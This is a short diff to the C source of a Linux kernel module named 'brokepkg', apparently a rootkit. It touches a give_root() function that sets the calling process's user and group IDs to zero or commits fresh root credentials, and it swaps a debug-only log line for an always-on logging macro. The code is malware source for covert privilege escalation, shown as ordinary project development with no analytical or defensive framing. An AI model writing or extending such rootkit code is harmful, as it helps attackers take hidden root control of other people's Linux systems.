@@ -3,6 +3,8 @@
 #include <linux/syscalls.h>
 #include <linux/version.h>
 
+#include "utils.h"
+
 void give_root(void) {
 #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
   current->uid = current->gid = 0;
@@ -28,7 +30,5 @@ void give_root(void) {
 #endif
   commit_creds(newcreds);
 #endif
-#ifdef DEBUG
-  printk(KERN_INFO "brokepkg: given away root");
-#endif
+  PR_INFO("brokepkg: given away root");
 }
